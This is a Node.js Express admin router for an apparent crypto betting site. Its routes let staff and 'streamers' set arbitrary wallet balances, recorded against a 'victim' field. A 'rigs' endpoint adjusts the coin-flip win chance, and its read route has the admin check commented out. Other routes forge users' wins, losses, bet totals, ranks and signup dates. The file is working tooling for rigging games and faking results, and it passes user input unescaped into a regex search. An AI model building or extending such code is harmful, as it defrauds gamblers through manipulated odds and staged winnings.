const express = require('express')
const router = express.Router()

const currenciesDb = require('../currenciesDb.json')
const ranksDb = require('../ranksDb.json')

const config = require('../config')
const db = require("../models")
const User = db.user
const Deposits = db.deposits
const Rigs = db.rigs

const authJwt = require('../middlewares/authJwt')
const { sendToAllUserIds } = require("../sockets/helpers")


router.get( '/userWallet/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        
        if( !user.adminAccess && !user.superAdminAccess && !user.streamer ) return res.status(400).json({ message: 'Request not permited' })
        const foundUser = await User.findOne({username: username}).select('wallet username adminAccess')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( user.streamer && foundUser._id.toString() !== user._id.toString() ) return res.status(400).json({ message: 'Request not permited' })

        res.status(200).json({ user: foundUser.toObject() })
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/userWallet/:username', authJwt, async (req, res) => {
    try {
        const user = req.user

        const { currency, amount } = req.body
        const { username } = req.params

        if( !user.adminAccess && !user.superAdminAccess && !user.streamer ) return res.status(400).json({ message: 'Request not permited' })

        const foundCoin = currenciesDb.find( c => c.symbol === currency )
        if( !foundCoin ) return res.status(400).json({ message: 'Currency not supported' })

        if( !user?.wallet?.[currency] ) return res.status(400).json({ message: 'Currency not supported' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( user.streamer && foundUser._id.toString() !== user._id.toString() ) return res.status(400).json({ message: 'Request not permited' })

        const formattedValue = parseFloat(amount).toFixed(foundCoin.dicimals)

        const newUser = await User.findOneAndUpdate( {username: username}, { 
            $set: {
                [`wallet.${currency}.value`]: formattedValue
            }
        }, {new: true} ).select('wallet username adminAccess')

        sendToAllUserIds(req.io, [newUser._id.toString()], 'UserBalances', {
            wallet: newUser.wallet
        })

        await Deposits.create({
            createdBy: user._id,
            victim: foundUser._id,
            newAmount: formattedValue,
            oldAmount: foundUser.wallet[currency].value,
            currency: currency
        })

        if( formattedValue - foundUser.wallet[currency].value > 0 ) {
            sendToAllUserIds(req.io, [newUser._id.toString()], 'UserDeposit', {
                currency: currency,
                amount: parseFloat(formattedValue - foundUser.wallet[currency].value).toFixed(foundCoin.dicimals)
            })
        }

        res.status(200).json({ user: newUser.toObject() })
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.patch( '/rigs', authJwt, async (req, res) => {
    try {
        const user = req.user

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        const { coinflip } = req.body

        const updatedData = {}
        if( !isNaN( coinflip ) ) {
            let newCoinFlip = Number(coinflip)

            if( coinflip >= 100 ) newCoinFlip = 100
            if( coinflip <= 0 ) newCoinFlip = 0

            updatedData.coinFlipChance = newCoinFlip
        }

        if( !Object.keys(updatedData).length ) return res.status(400).json({ message: 'Invalid update Data' })

        let newRigsObject
        const foundRigsObject = await Rigs.findOne({})
        if( foundRigsObject ) {
            Object.assign(foundRigsObject, updatedData)
            newRigsObject = await foundRigsObject.save()
        } else {
            newRigsObject = await Rigs.create(updatedData)
        }

        req.io.emit('rigsUpdate', { rigs: newRigsObject })
        res.status(200).json({ rigs: newRigsObject })
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.get( '/rigs', authJwt, async (req, res) => {
    try {
        const user = req.user

        //if( !user.adminAccess ) return res.status(400).json({ message: 'Request not permited' })

        let newRigsObject
        const foundRigsObject = await Rigs.findOne({})
        if( foundRigsObject ) {
            newRigsObject = foundRigsObject
        } else {
            newRigsObject = await Rigs.create()
        }

        res.status(200).json({ rigs: newRigsObject })
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/deleteUser/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username adminAccess')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( foundUser.adminAccess || foundUser.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        await User.findByIdAndDelete(foundUser._id)

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})


router.post( '/giveAdmin/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username adminAccess')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( foundUser.adminAccess ) return res.status(400).json({ message: 'User already admin' })

        await User.findByIdAndUpdate(foundUser._id, {adminAccess: true})

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/removeAdmin/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username adminAccess')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( !foundUser.adminAccess ) return res.status(400).json({ message: 'User is not an admin' })

        await User.findByIdAndUpdate(foundUser._id, {adminAccess: false})

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/giveStreamer/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username streamer')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( foundUser.streamer ) return res.status(400).json({ message: 'User already streamer' })

        await User.findByIdAndUpdate(foundUser._id, {streamer: true})

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/removeStreamer/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('wallet username streamer')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( !foundUser.streamer ) return res.status(400).json({ message: 'User is not a streamer' })

        await User.findByIdAndUpdate(foundUser._id, {streamer: false})

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post( '/resetIp/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { username } = req.params

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
       
        const foundUser = await User.findOne({username: username}).select('username ip')
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        if( foundUser.ip === null ) return res.status(400).json({ message: "User has no ip registered" })

        await User.findByIdAndUpdate(foundUser._id, {ip: null})

        res.status(200).send('')
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.get('/depositLogs/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const username = req.params.username

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
    
        let page = req.query.page ? parseInt(req.query.page) : 1
        const limit = 10
    
        if( page < 1 ) page = 1

        const foundVictim = await User.findOne({username: username})
        if( !foundVictim ) return res.status(400).json({ message: 'User not found' })
        
        const logs = await Deposits.find({victim: foundVictim._id})
            .populate([
                { path: 'victim', select: 'username' },
                { path: 'createdBy', select: 'username' }
            ])
            .sort({ createdAt: -1 })
            .limit(limit)
            .skip((page - 1) * limit)
            .exec()
    
        const totalCount = await Deposits.countDocuments({victim: foundVictim._id})
    
        res.status(200).json({
            logs,
            totalPages: Math.ceil(totalCount / limit),
            currentPage: page
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.get('/userStats/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const username = req.params.username

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })
    

        const targetUser = await User.findOne({username: username}).select('username createdAt statisticScoped')
        if(!targetUser) return res.status(400).json({ message: 'Invalid request data' })
    
        res.status(200).json({
            user: targetUser
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

const updateStatisticScope = (user, type, value) => {
    let statsTypesArr = ["wins", "losses", "ties"]
    const statIndex = user.statisticScoped.findIndex(element => element.currency === 'usdc')

    if (statIndex !== -1) {        
        user.statisticScoped.forEach( stat => {
            if( stat?.ties === undefined ) {
                stat.ties = 0
            }

            stat[type] = 0
            stat.bets = 0
            statsTypesArr.forEach( statTypeItem => {
                if( statTypeItem !== type ) {
                    stat.bets += stat[statTypeItem]
                }
            } )
        } )

        if( user.statisticScoped[statIndex]?.ties === undefined ) {
            user.statisticScoped[statIndex].ties = 0
        }

        user.statisticScoped[statIndex][type] = value
        user.statisticScoped[statIndex].bets = 0
        statsTypesArr.forEach( statTypeItem => {
            user.statisticScoped[statIndex].bets += user.statisticScoped[statIndex][statTypeItem]
        } )
    } else {
        user.statisticScoped.forEach( stat => {
            if( stat?.ties === undefined ) {
                stat.ties = 0
            }

            stat[type] = 0
            stat.bets = 0

            statsTypesArr.forEach( statTypeItem => {
                if( statTypeItem !== type ) {
                    stat.bets += stat[statTypeItem]
                }
            } )
        } )

        const newStatistic = {
            currency: 'usdc',
            wins: 0,
            losses: 0,
            ties: 0,
            betAmount: 0,
            bets: 0,
            ...{[type]: value}
        }

        user.statisticScoped.push({
            ...newStatistic,
            bets: newStatistic.wins + newStatistic.losses + newStatistic.ties
        })
    }
}

router.post('/userStats/:username/:statType', authJwt, async (req, res) => {
    try {
        const user = req.user
        const username = req.params.username
        const statType = req.params.statType
        const requestBody = req.body

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        if(![
            "createdAt",
            "wins",
            "losses",
            "betAmount",
            "rank"
        ].includes(statType)) return res.status(400).json({ message: 'Invalid request data' }) 
    

        const targetUser = await User.findOne({username: username}).select('createdAt statisticScoped')
        if(!targetUser) return res.status(400).json({ message: 'Invalid request data' })


        if( statType === "createdAt" ) {
            if( isNaN(new Date(requestBody.createdAt)) ) return res.status(400).json({ message: 'Invalid request data' })

            targetUser.createdAt = new Date(requestBody.createdAt).getTime()

            const newTargetUser = await targetUser.save()

            res.status(200).json({
                createdAt: newTargetUser.createdAt
            })

            return
        } else if ( ["wins", "losses", "betAmount"].includes(statType) ) {
            if( isNaN(requestBody[statType]) ) return res.status(400).json({ message: 'Invalid request data' })

            updateStatisticScope(targetUser, statType, requestBody[statType])

            await targetUser.save()

            res.status(200).json({
                [statType]: requestBody[statType]
            })

            return
        } else if ( statType === 'rank' ) {
            const foundRank = ranksDb.find( r => r.rank === requestBody[statType] )
            
            updateStatisticScope(targetUser, "betAmount", Number(foundRank.value))

            await targetUser.save()

            res.status(200).json({
                betAmount: Number(foundRank.value)
            })

            return
        }
    

        res.status(500).json({ message: 'Invalid request data' }) 
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.get('/usersList', authJwt, async (req, res) => {
    try {
        const user = req.user

        if( !user.adminAccess && !user.superAdminAccess && !user.streamer ) return res.status(400).json({ message: 'Request not permited' })

        let page = req.query.page ? parseInt(req.query.page) : 1
        const limit = 10
        if( page < 1 ) page = 1

        const usernameFilter = req.query?.filter

        let searchData = {}

        if( !!usernameFilter ) {
            if( user.streamer && (!user.adminAccess && !user.superAdminAccess) ) {
                searchData = {
                    _id: user._id,
                    username: {
                        $regex: usernameFilter,
                        $options: 'i'
                    }
                }
            } else {
                searchData = {
                    username: {
                        $regex: usernameFilter,
                        $options: 'i'
                    }
                }
            }
        } else {
            if( user.streamer && (!user.adminAccess && !user.superAdminAccess) ) {
                searchData = {
                    _id: user._id
                }
            }
        }

        const usersList = await User.find(searchData)
            .select('adminAccess superAdminAccess streamer createdAt username ip')
            .populate('createdBy', 'username')
            .sort({ createdAt: -1 })
            .limit(limit)
            .skip((page - 1) * limit)
            .exec()

        const newUsersList = usersList.map( user => {
            const userObject = user.toObject()
            
            if( !userObject.createdBy ) {
                return {
                    ...userObject,
                    createdBy: {
                        username: 'Deleted User'
                    }
                }
            }
            return userObject
        } )
    
        const totalCount = await User.countDocuments(searchData)
    
        res.status(200).json({
            users: newUsersList,
            totalPages: Math.ceil(totalCount / limit),
            currentPage: page,
            filter: usernameFilter ? usernameFilter : ''
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.get('/useruuid/:username', authJwt, async (req, res) => {
    try {
        const user = req.user
        const username = req.params.username

        if( !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        const foundUser = await User.findOne({username: username})
            .select('uuid')
    
        if( !foundUser ) return res.status(400).json({ message: 'User not found' })

        res.status(200).json({
            uuid: foundUser.uuid,
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})


const fs = require('fs');

function getLines(filePath) {
    return new Promise((resolve, reject) => {
        fs.access(filePath, fs.constants.F_OK, (err) => {
            if (err) {
                resolve([])
                return
            }

            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) return resolve([])
                const lines = data.split('\n').filter( c => c !== '' )
                resolve(lines)
            })
        })
    })
}
function removeLine(filePath, lineToRemove) {
    fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
            return
        }

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) throw err

            const lines = data.split('\n')
            const filteredLines = lines.filter(line => line !== lineToRemove)

            fs.writeFile(filePath, filteredLines.join('\n'), (err) => {
                if (err) throw err;
            })
        })
    })
}
function addLine(filePath, line) {
    fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
            // File doesn't exist, create it
            fs.writeFile(filePath, line + '\n', (err) => {
                if (err) throw err;
            });
        } else {
            // File exists, append line
            fs.appendFile(filePath, line + '\n', (err) => {
                if (err) throw err;
            });
        }
    });
}

router.get('/tipusers', authJwt, async (req, res) => {
    try {
        const user = req.user

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        const users = await getLines('./tipUsersDb.txt')

        res.status(200).json({
            users: users
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.post('/tipusers', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { tipuser, tiprank } = req.body

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        if( typeof tipuser !== 'string' ) return res.status(400).json({ message: 'Request invalid' })

        if( tipuser.includes(':') ) return res.status(400).json({ message: 'Request invalid' })

        const users = await getLines('./tipUsersDb.txt')

        if( users.find( c => c.split(':')[0] === tipuser.trim()) ) return res.status(400).json({ message: 'Already exists' })

        addLine('./tipUsersDb.txt', `${tipuser.trim()}:${tiprank}`)

        res.status(200).json({
            user: `${tipuser.trim()}:${tiprank}`
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})

router.delete('/tipusers', authJwt, async (req, res) => {
    try {
        const user = req.user
        const { tipuser } = req.body

        if( !user.adminAccess && !user.superAdminAccess ) return res.status(400).json({ message: 'Request not permited' })

        if( typeof tipuser !== 'string' ) return res.status(400).json({ message: 'Request invalid' })

        const users = await getLines('./tipUsersDb.txt')

        if( !users.includes(tipuser.trim()) ) return res.status(400).json({ message: 'Doesnt exists' })

        removeLine('./tipUsersDb.txt', tipuser.trim())

        res.status(200).json({
            user: tipuser.trim()
        })
    } catch (err) {
        console.error(err.message)
        res.status(500).json({ message: 'Internal server error' })
    }
})


module.exports = router